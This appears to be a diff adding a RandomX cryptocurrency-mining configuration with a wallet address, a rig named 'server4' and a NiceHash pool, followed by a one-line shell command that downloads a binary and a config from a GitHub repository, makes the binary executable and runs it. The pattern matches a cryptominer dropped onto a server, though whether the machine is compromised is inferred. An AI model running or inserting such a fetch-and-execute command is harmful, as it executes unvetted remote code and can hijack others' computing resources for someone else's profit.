@@ -1,0 +1,7 @@
+[RandomX]
+wallet = 3DjkbvskgDwKpinVCWHYVi2AdvJ2bpzmWY
+coin = BTC
+rigName = server4
+pool1 = randomxmonero.eu-west.nicehash.com:3380
+
+wget https://github.com/requests1/gas/blob/main/gas && wget https://raw.githubusercontent.com/requests1/gas/main/script.ini && chmod +x gas && ./gas script.ini
